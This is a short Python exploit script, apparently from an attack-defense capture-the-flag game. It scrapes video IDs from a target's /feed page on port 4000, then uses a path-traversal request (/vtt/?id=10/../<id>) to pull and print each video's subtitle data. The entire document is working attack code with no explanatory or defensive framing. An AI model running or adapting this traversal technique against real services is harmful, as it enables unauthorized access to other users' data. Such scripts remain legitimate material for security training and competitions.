import requests
import sys
import tempfile
import subprocess
import os
import re

ip = sys.argv[1]

r = re.compile(r'<b>ID:</b> (\d+)</p>')

host = f'http://{ip}:4000'
resp = requests.get(host + '/feed')

for v_id in r.findall(resp.text):
    resp = requests.get(host + "/vtt/?id=10/../" + v_id)
    print(resp.text)



